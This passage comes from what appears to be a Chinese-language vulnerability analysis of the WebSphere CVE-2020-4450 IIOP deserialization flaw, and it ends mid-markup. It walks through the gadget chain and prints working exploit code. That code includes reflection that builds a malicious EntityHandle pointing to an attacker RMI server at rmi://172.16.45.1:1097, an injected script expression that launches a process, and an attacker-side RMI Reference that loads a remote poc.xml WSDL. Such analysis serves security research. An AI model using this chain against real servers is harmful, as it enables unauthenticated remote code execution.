punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这样就可以成功执行到<code>propContext.implementation_specific_data = inputStream.read_any()</code>这行代码。继续跟入</p><p>跟到TCUtility类的unmarshalIn方法中，这里遇到了第三个问题，根据<a href="https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere此篇博文中的介绍，该方法中有一个switch我们需要走到如下图所示的代码位置" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere此篇博文中的介绍，该方法中有一个switch我们需要走到如下图所示的代码位置</a></p><p>![17](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/17.png)</p><p>但是目前的参数经过选择是走不到此处的，所以就又需要我们来查看此处的参数是否是前端传入并且是否可控了，如果可控那就需要我们继续在前端对数据进行构造。</p><p>我们先观察这里传递进来的第一个参数也就是var0 一个InputStream类型的参数</p><p>![18](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/18.png)</p><p>代码调回到PropagationContext类的demarshalContext方法，看到出发漏洞的代码如下图所示，其实结合客户端的代码不难知道这是在反序列化我们传递的PropagationContext对象里封装的一个AnyImpl对象那个</p><p>![19](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/19.png)</p><p>其实结合客户端的代码不难知道这是在反序列化我们传递的PropagationContext对象里封装的一个AnyImpl对象那个</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//就是这个AnyImpl</span>Any any <span class="token operator">=</span> orb<span class="token punctuation">.</span><span class="token function">create_any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PropagationContext propagationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropagationContext</span><span class="token punctuation">(</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">TransIdentity</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">otid_t</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">TransIdentity</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        any<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>根据博文中的描述IBM Java SDK中Classloader中禁掉了一些gadget用到的类，TemplatesImpl类不再是可序列化的，而此类又常用于很多公共gadget链中，根据IBM Java SDK中TemplatesImpl类和oracle JDK中TemplatesImpl类的继承关系可以确认这一点。</p><p>Oracle JDK中的TemplatesImpl类的继承关系</p><p>![20](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/20.png)</p><p>IBM Java SDK中的TemplatesImpl类的继承关系，可以看到没有实现Serializable接口</p><p>![21](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/21.png)</p><p>IBM SDK不使用Oracle JDK的Java命名和目录接口(JNDI)实现。因此，它不会受到通过RMI/LDAP加载远程类的攻击，以上的种种限制都增加了RCE的难度，我们需要重新在IBM WebSphere中找到一条新的利用链。</p><p>大佬们给出了相应的思路，IBM WebSphere中有这么一个类WSIFPort_EJB可以作为入口，此次反序列化RCE利用了WSIFPort_EJB在反序列化时会从前端传入的数据中反序列化初一个Handle对象，并且会调用该对象的getEJBObject()方法。</p><p>![22](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/22.png)</p><p>我们需要将WSIFPort_EJB封装入PropagationContext类的implementation_specific_data属性中，也就是AnyImpl对像中，这样在执行<code>propContext.implementation_specific_data = inputStream.read_any()</code> 将AnyImpl对象从inputStream中反序列化出来的时候，就会自然而然的去反序列化我们封装进去的WSIFPort_EJB方法从而执行其readObject方法</p><p>![23](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/23.png)</p><p>代码如下</p><pre class=" language-java"><code class="language-java">        WSIFPort_EJB wsifPort_ejb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WSIFPort_EJB</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>                Any any <span class="token operator">=</span> orb<span class="token punctuation">.</span><span class="token function">create_any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        any<span class="token punctuation">.</span><span class="token function">insert_Value</span><span class="token punctuation">(</span>wsifPort_ejb<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改完后再次运行，发现可以执行到此次反序列化漏洞的入口点，WSIFPort_EJB类的readObject方法了</p><p>![24](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/24.png)</p><p>由于我们选择利用这里的<code>handle.getEJBObject()</code>方法，所以需要找到一个实现了Handle接口的类，最终找到了com.ibm.ejs.container.EntityHandle这个类</p><p>在谈到EntityHandle这个类之前我们先看下EntityHandle的getEJBObject方法，以下是该方法中的部分代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> EJBObject <span class="token function">getEJBObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//此处的this.homeJNDIName和homeClass皆为我们可控</span>                home <span class="token operator">=</span> <span class="token punctuation">(</span>EJBHome<span class="token punctuation">)</span>PortableRemoteObject<span class="token punctuation">.</span><span class="token function">narrow</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>homeJNDIName<span class="token punctuation">)</span><span class="token punctuation">,</span> homeClass<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoInitialContextException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>                Properties p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                p<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.initial"</span><span class="token punctuation">,</span> <span class="token string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>                home <span class="token operator">=</span> <span class="token punctuation">(</span>EJBHome<span class="token punctuation">)</span>PortableRemoteObject<span class="token punctuation">.</span><span class="token function">narrow</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>homeJNDIName<span class="token punctuation">)</span><span class="token punctuation">,</span> homeClass<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Method fbpk <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findFindByPrimaryKey</span><span class="token punctuation">(</span>homeClass<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token punctuation">(</span>EJBObject<span class="token punctuation">)</span>fbpk<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>home<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var10<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>首先我们已知this.homeJNDIName是我们可控的，那么就意味着我们可以指定WebSphere去lookup一个指定rmi或者ldap服务器，我们在服务器上可以放一个RMI Reference 来让WebSphere进行加载。</p><p>生成一个可利用EntityHandle的对象需要通过一系列比较复杂的反射，根据Iswin大佬提供的思路，代码如下</p><pre class=" language-java"><code class="language-java">WSIFPort_EJB wsifPort_ejb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WSIFPort_EJB</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>Field fieldEjbObject <span class="token operator">=</span> wsifPort_ejb<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"fieldEjbObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fieldEjbObject<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fieldEjbObject<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>wsifPort_ejb<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">EJSWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Handle <span class="token function">getHandle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        Handle var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            SessionHome sessionHome <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SessionHome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            J2EEName j2EEName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">J2EENameImpl</span><span class="token punctuation">(</span><span class="token string">"iswin"</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            Field j2eeName <span class="token operator">=</span> EJSHome<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"j2eeName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j2eeName<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j2eeName<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>sessionHome<span class="token punctuation">,</span>j2EEName<span class="token punctuation">)</span><span class="token punctuation">;</span>            Field jndiName <span class="token operator">=</span> EJSHome<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"jndiName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jndiName<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//jndiName.set(sessionHome,System.getProperty("rmi_backedn"));</span>            jndiName<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>sessionHome<span class="token punctuation">,</span><span class="token string">"rmi://172.16.45.1:1097/Object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BeanId beanId <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanId</span><span class="token punctuation">(</span>sessionHome<span class="token punctuation">,</span><span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Properties initProperties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            initProperties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.object"</span><span class="token punctuation">,</span><span class="token string">"org.apache.wsif.naming.WSIFServiceObjectFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Constructor entiyHandleConstructor <span class="token operator">=</span> EntityHandle<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>BeanId<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>BeanMetaData<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Properties<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            entiyHandleConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BeanMetaData beanMetaData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanMetaData</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            beanMetaData<span class="token punctuation">.</span>homeInterfaceClass <span class="token operator">=</span> com<span class="token punctuation">.</span>ibm<span class="token punctuation">.</span>ws<span class="token punctuation">.</span>batch<span class="token punctuation">.</span>CounterHome<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>            var2 <span class="token operator">=</span> <span class="token punctuation">(</span>Handle<span class="token punctuation">)</span>entiyHandleConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>beanId<span class="token punctuation">,</span>beanMetaData<span class="token punctuation">,</span>initProperties<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>之所以这样写是因为WSIFPort_EJB对象在序列化时会调用自身的fieldEjbObject属性的getHandle方法，并将其返回值进行序列化，所以我们通过反射为fieldEjbObject属性赋值一个EJSWrapper对象，并重写其getHandle方法，在getHandle通过反射实例化EntityHandle对象。</p><p>![25](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/25.png)</p><p>回到EntityHandle的getEJBObject方法中，跟进ctx.lookup(this.homeJNDIName) 跟到ObjectFactoryHelper的getObjectInstanceViaContextDotObjectFactories方法里的时候可以看到</p><p>![26](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/26.png)</p><p>这里看到environment参数是我们可控的，所以在该方法中可以调用我们指定的factory的getObjectInstance方法，可以看到这里的值是在我们在EntityHandle实例化的时候作为参数传递进去了</p><p>![27](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/27.png)</p><p>我们传递进去的值是 <code>org.apache.wsif.naming.WSIFServiceObjectFactory</code> 所以会调用WSIFServiceObjectFactory类的getObjectInstance方法</p><p>我们来看一下该方法的部分代码，这里会对look加载的Reference的信息进行解析，并挨个Reference中的值取出。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context context<span class="token punctuation">,</span> Hashtable env<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    Trc<span class="token punctuation">.</span><span class="token function">entry</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> obj<span class="token punctuation">,</span> name<span class="token punctuation">,</span> context<span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Reference</span> <span class="token operator">&amp;&amp;</span> obj <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>WSIFServiceStubRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            wsdlLoc <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"wsdlLoc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serviceNS <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"serviceNS"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serviceName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"serviceName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            portTypeNS <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"portTypeNS"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            portTypeName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"portTypeName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String preferredPort <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"preferredPort"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resolveString</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"className"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>wsdlLoc <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                WSIFServiceFactory factory <span class="token operator">=</span> WSIFServiceFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                WSIFService service <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span>wsdlLoc<span class="token punctuation">,</span> serviceNS<span class="token punctuation">,</span> serviceName<span class="token punctuation">,</span> portTypeNS<span class="token punctuation">,</span> portTypeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                Class <span class="token class-name">iface</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object stub <span class="token operator">=</span> service<span class="token punctuation">.</span><span class="token function">getStub</span><span class="token punctuation">(</span>preferredPort<span class="token punctuation">,</span> iface<span class="token punctuation">)</span><span class="token punctuation">;</span>                Trc<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> stub<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    Trc<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>来看一下Reference中的代码。</p><pre class=" language-java"><code class="language-java">Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1097</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>WSIFServiceStubRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> null<span class="token punctuation">,</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"wsdlLoc"</span><span class="token punctuation">,</span><span class="token string">"http://172.16.45.1:8000/poc.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"serviceNS"</span><span class="token punctuation">,</span><span class="token string">"http://www.ibm.com/namespace/wsif/samples/ab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"serviceName"</span><span class="token punctuation">,</span><span class="token string">"rce_service"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"portTypeNS"</span><span class="token punctuation">,</span><span class="token string">"http://www.ibm.com/namespace/wsif/samples/ab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"portTypeName"</span><span class="token punctuation">,</span><span class="token string">"RceServicePT"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"preferredPort"</span><span class="token punctuation">,</span><span class="token string">"JavaPort"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reference<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"className"</span><span class="token punctuation">,</span><span class="token string">"com.ibm.ws.batch.CounterHome"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里先要注意到的一点就是最后有一个<code>reference.add(new StringRefAddr("className","com.ibm.ws.batch.CounterHome"))</code>这里牵扯到最终该getObjectInstance函数返回值的类型问题，之前在看EntityHandle的getEJBObject方法时,narrow方法的返回值其实就是ctx.lookup(this.homeJNDIName)的返回值，也就是说ctx.lookup(this.homeJNDIName)返回值的类型是要实现自EJBHome接口</p><pre class=" language-java"><code class="language-java">home <span class="token operator">=</span> <span class="token punctuation">(</span>EJBHome<span class="token punctuation">)</span>PortableRemoteObject<span class="token punctuation">.</span><span class="token function">narrow</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>homeJNDIName<span class="token punctuation">)</span><span class="token punctuation">,</span> homeClass<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>WSIFServiceObjectFactory的getObjectInstance方法的返回值是一个Proxy类型，而该Proxy类型在创建时传入的接口参数就是Reference中的<code>new StringRefAddr("className","com.ibm.ws.batch.CounterHome")</code>，之所以选择CounterHome作为返回的Proxy对象的接口，CounterHome继承了EJBHome是一个原因，还有一个原因就是该接口中声明了接下来要用到了findFindByPrimaryKey方法</p><p>![28](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/28.png)</p><p>讲完了为何选择CounterHome作为返回Proxy对象的接口，接下来getObjectInstance方法中还有这么一段代码</p><pre class=" language-java"><code class="language-java">WSIFService service <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span>wsdlLoc<span class="token punctuation">,</span> serviceNS<span class="token punctuation">,</span> serviceName<span class="token punctuation">,</span> portTypeNS<span class="token punctuation">,</span> portTypeName<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里会根据解析的Reference中的wsdlLoc字段的值也就是<a href="http://172.16.45.1:8000/poc.xml去该地址加载制定的xml文件，这个poc.xml就是一个WSDL文件内容如下，关于此WSDL文件的构造可以参考此篇文章https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html#N10041" target="_blank" rel="noopener">http://172.16.45.1:8000/poc.xml去该地址加载制定的xml文件，这个poc.xml就是一个WSDL文件内容如下，关于此WSDL文件的构造可以参考此篇文章https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html#N10041</a></p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>definitions        name<span class="token operator">=</span><span class="token string">"RceServicePT"</span>        targetNamespace<span class="token operator">=</span><span class="token string">"http://www.ibm.com/namespace/wsif/samples/ab"</span>        xmlns<span class="token operator">:</span>xsd<span class="token operator">=</span><span class="token string">"http://www.w3.org/2000/10/XMLSchema"</span>             xmlns<span class="token operator">:</span>tns<span class="token operator">=</span><span class="token string">"http://www.ibm.com/namespace/wsif/samples/ab"</span>             xmlns<span class="token operator">:</span>format<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/wsdl/formatbinding/"</span>             xmlns<span class="token operator">:</span>java<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/wsdl/java/"</span>             xmlns<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/wsdl/"</span>             xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>             xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/wsdl/formatbinding/"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>message name<span class="token operator">=</span><span class="token string">"findByPrimaryKeyRequse"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>part name<span class="token operator">=</span><span class="token string">"term"</span> type<span class="token operator">=</span><span class="token string">"xsd:string"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>message<span class="token operator">></span>    <span class="token operator">&lt;</span>message name<span class="token operator">=</span><span class="token string">"findByPrimaryKeyReponse"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>part name<span class="token operator">=</span><span class="token string">"value"</span> type<span class="token operator">=</span><span class="token string">"xsd:object"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>message<span class="token operator">></span>    <span class="token operator">&lt;</span>portType name<span class="token operator">=</span><span class="token 